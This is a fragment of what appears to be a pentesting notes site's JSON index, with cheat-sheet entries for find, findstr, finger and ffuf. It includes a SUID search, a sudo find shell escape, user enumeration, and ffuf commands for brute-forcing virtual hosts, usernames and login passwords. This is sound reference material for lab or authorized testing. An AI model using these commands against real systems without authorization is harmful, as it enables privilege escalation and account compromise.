stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u+s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -g+s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; {}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; 2&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h3 id=&quot;find-world-writableexecutable-folders&quot;&gt;Find world writable/executable folders&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#find-world-writableexecutable-folders&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o+w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o+x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; 2&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;shell-escape&quot;&gt;Shell escape&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#shell-escape&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If find can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then try:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; .&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /bin/sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -quit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/findstr":{"slug":"spells/findstr","filePath":"spells/findstr.md","title":"findstr","links":["spells/grep"],"tags":["Application/findstr","Application/grep","OS/Windows"],"content":"The Windows findstr command is a bit like grep on *NIX systems.\n# Use findstr to filter the output of systeminfo (or another\n# command):\n#\nsysteminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;","richContent":"&lt;p&gt;The Windows findstr command is a bit like &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/grep&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/grep&quot;&gt;grep&lt;/a&gt; on *NIX systems.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Use findstr to filter the output of systeminfo (or another&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# command):&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;systeminfo &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; findstr &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;B &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;OS Name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;OS Version&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;System Type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/finger":{"slug":"spells/finger","filePath":"spells/finger.md","title":"finger","links":[],"tags":["Application/finger","AttackCycle/Reconnaissance"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_CTF.txt.\n\n\n\nCheck if a user account exits on a given host:\nfinger $USER@$IP_ADDRESS\nThis obviously requires finger to be running and a list of users to try.","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_CTF.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_CTF.txt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Check if a user account exits on a given host:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;finger&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$IP_ADDRESS&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This obviously requires finger to be running and a list of users to try.&lt;/p&gt;"},"spells/fuff":{"slug":"spells/fuff","filePath":"spells/fuff.md","title":"fuff","links":["spells/HTTP"],"tags":["Application/fuff","AttackCycle/Reconnaissance/Fuzzing","AttackCycle/Exploitation/BruteForcing"],"content":"A general web fuzzing tool. Use FUZZ as your placeholder.\nDirectory/file enumeration\nffuf -w /usr/share/wordlists/dirb/common.txt \\\n     -u https://$DOMAIN/FUZZ\nBrute force virtual hosts\nfuff can fuzz HTTP headers, which can be used to try to brute force virtual host entries.\nffuf -w /usr/share/wordlists/metasploit/namelist.txt \\\n     -H &quot;Host: FUZZ.$DOMAIN&quot; \\\n     -u https://$IP\nUse -fs $SIZE to remove results of a particular size from the list (which you’ll probably need to do when trying to brute force virtual hosted subdomains).\nUsername enumeration\nAssuming that our login or password reset form isn’t AJAX-y:\nffuf -w /usr/share/wordlists/wfuzz/others/names.txt \\\n     -X POST -d &quot;$POST_VARS&quot; \\\n     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \\\n     -u $FORM_URL -mr &quot;$ERROR_MEESAGE_SUBSTRING&quot; -s\nHere $POST_VARS should look something like username=FUZZ&amp;email=FUZZ@example.com&amp;password=1234&amp;cpassword=1234. The -mr flag instructs ffuf to filter on page text for a “successful hit”; -s supresses all output except successful fuzzes (as defined by -mr).\nBrute force login credentials\nffuf -w /usr/share/wordlists/wfuzz/others/names.txt:W1,$HOME/.local/share/red-team/wordlists/rockyou.txt:W2 \\\n     -X POST -d &quot;$POST_VARS&quot; \\\n     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \\\n     -u $LOGIN_URL -fc 200 -s\nHere we assign W1 and W2 to take terms from the two supplied wordlists; $POST_VARS then looks something like username=W1&amp;password=W2. This example assumes that a successful login will return an HTTP status code other than 200 (probably a 301 or 302);  -s supresses all output except successful fuzzes (the inverse of -fc).\nNote that ffuf will try every possible combination of elements between the two wordlists, which means that the number of combinations tried grows geometrically. So you probably don’t want to try the above example directly, but rather generate a shorter user list first via enumeration (see the previous section).","richContent":"&lt;p&gt;A general web fuzzing tool. Use &lt;code&gt;FUZZ&lt;/code&gt; as your placeholder.&lt;/p&gt;\n&lt;h2 id=&quot;directoryfile-enumeration&quot;&gt;Directory/file enumeration&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#directoryfile-enumeration&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ffuf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/dirb/common.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; https://&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/FUZZ&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;brute-force-virtual-hosts&quot;&gt;Brute force virtual hosts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#brute-force-virtual-hosts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;fuff can fuzz &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; headers, which can be used to try to brute force virtual host entries.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ffuf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/metasploit/namelist.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -H&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Host: FUZZ.$DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; https://&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Use &lt;code&gt;-fs $SIZE&lt;/code&gt; to remove results of a particular size from the list (which you’ll probably need to do when trying to brute force virtual hosted subdomains).&lt;/p&gt;\n&lt;h2 id=&quot;username-enumeration&quot;&gt;Username enumeration&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#username-enumeration&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Assuming that our login or password reset form isn’t AJAX-y:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ffuf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/wfuzz/others/names.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -X&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; POST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$POST_VARS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -H&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FORM_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -mr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$ERROR_MEESAGE_SUBSTRING&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Here &lt;code&gt;$POST_VARS&lt;/code&gt; should look something like &lt;code&gt;username=FUZZ&amp;#x26;email=FUZZ@example.com&amp;#x26;password=1234&amp;#x26;cpassword=1234&lt;/code&gt;. The &lt;code&gt;-mr&lt;/code&gt; flag instructs ffuf to filter on page text for a “successful hit”; &lt;code&gt;-s&lt;/code&gt; supresses all output except successful fuzzes (as defined by &lt;code&gt;-mr&lt;/code&gt;).&lt;/p&gt;\n&lt;h2 id=&quot;brute-force-login-credentials&quot;&gt;Brute force login credentials&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#brute-force-login-credentials&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ffuf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -w&lt;/span&gt;&lt;span 